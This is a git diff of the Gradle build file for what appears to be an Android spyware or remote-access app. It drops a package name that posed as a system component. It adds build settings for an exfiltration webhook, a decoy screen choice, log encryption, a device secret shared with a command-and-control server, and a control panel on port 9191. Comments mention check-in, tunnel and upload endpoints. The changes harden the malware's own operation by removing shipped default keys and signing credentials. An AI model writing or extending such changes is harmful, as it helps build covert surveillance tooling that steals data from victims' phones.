@@ -19,23 +19,26 @@ android {
     }
 
     defaultConfig {
-        applicationId "com.android.system.stability"
+        applicationId "com.stability.sync"
         minSdk 21
         targetSdk 34
         versionCode 623
         versionName "3.7.9"
         multiDexEnabled true
-        
-        // Read WEBHOOK_URL from local.properties
+
+        // Read build-time config from local.properties
         def localProperties = new Properties()
         def localPropertiesFile = rootProject.file('local.properties')
         if (localPropertiesFile.exists()) {
             localProperties.load(new FileInputStream(localPropertiesFile))
         }
-        
+
         def webhookUrl = (localProperties['WEBHOOK_URL'] ?: "").trim().replace("\"", "").replace("'", "")
         def decoyChoice = (localProperties['DECOY_CHOICE'] ?: "1").toString().trim()
-        def encryptionKey = (localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337").trim().replace("\"", "").replace("'", "")
+        // [SECURITY] No shipped default encryption key: empty fallback + hard build warning.
+        def encryptionKey = (localProperties['ENCRYPTION_KEY'] ?: "").trim().replace("\"", "").replace("'", "")
+        def deviceSecret = (localProperties['DEVICE_SECRET'] ?: "").trim().replace("\"", "").replace("'", "")
+        def panelBind = (localProperties['PANEL_BIND_ADDRESS'] ?: "127.0.0.1").trim().replace("\"", "").replace("'", "")
 
         if (webhookUrl.isEmpty()) {
             println "-------------------------------------------------------------------------"
@@ -45,20 +48,41 @@ android {
         } else {
             println "[BUILD SUCCESS] Webhook target configured: ${webhookUrl}"
         }
+        if (encryptionKey.isEmpty()) {
+            println "-------------------------------------------------------------------------"
+            println "[BUILD WARNING] ENCRYPTION_KEY is EMPTY in local.properties! Log encryption will be degraded."
+            println "[BUILD WARNING] The hardened build scripts (apk-builder/) abort on this condition. Set a 16+ char random key."
+            println "-------------------------------------------------------------------------"
+        }
 
         buildConfigField "String", "WEBHOOK_URL", "\"${webhookUrl}\""
         buildConfigField "int", "DECOY_CHOICE", "${decoyChoice}"
         buildConfigField "String", "ENCRYPTION_KEY", "\"${encryptionKey}\""
+        // [SECURITY] Device endpoints (/checkin, /tunnel-*, /upload) authenticate with the
+        // X-Device-Secret header; the value must equal DEVICE_SECRET on the C2 server.
+        buildConfigField "String", "DEVICE_SECRET", "\"${deviceSecret}\""
+        // [SECURITY] The in-app 9191 panel binds to loopback by default; set
+        // PANEL_BIND_ADDRESS=0.0.0.0 in local.properties only for IPv6 direct-connect mode.
+        buildConfigField "String", "PANEL_BIND_ADDRESS", "\"${panelBind}\""
     }
 
     signingConfigs {
         release {
             if (keystorePropertiesFile.exists()) {
+                def storeFileProp = keystoreProperties['storeFile']
+                def storePassProp = keystoreProperties['storePassword']
+                def aliasProp = keystoreProperties['keyAlias']
+                def keyPassProp = keystoreProperties['keyPassword']
+                // [SECURITY] No shipped default credentials: refuse to build when
+                // keystore.properties exists but is incomplete.
+                if (!storeFileProp || !storePassProp || !aliasProp || !keyPassProp) {
+                    throw new GradleException("[BUILD ABORT] keystore.properties exists but storeFile/storePassword/keyAlias/keyPassword are missing. Provide explicit credentials; default credentials are blocked.")
+                }
                 println "[BUILD] Keystore config detected: ${keystorePropertiesFile.absolutePath}"
-                storeFile rootProject.file(keystoreProperties['storeFile'] ?: 'lab-rats-keystore.jks')
-                storePassword keystoreProperties['storePassword'] ?: 'lab-rats123'
-                keyAlias keystoreProperties['keyAlias'] ?: 'lab-rats-key'
-                keyPassword keystoreProperties['keyPassword'] ?: 'lab-rats123'
+                storeFile rootProject.file(storeFileProp)
+                storePassword storePassProp
+                keyAlias aliasProp
+                keyPassword keyPassProp
             }
         }
     }
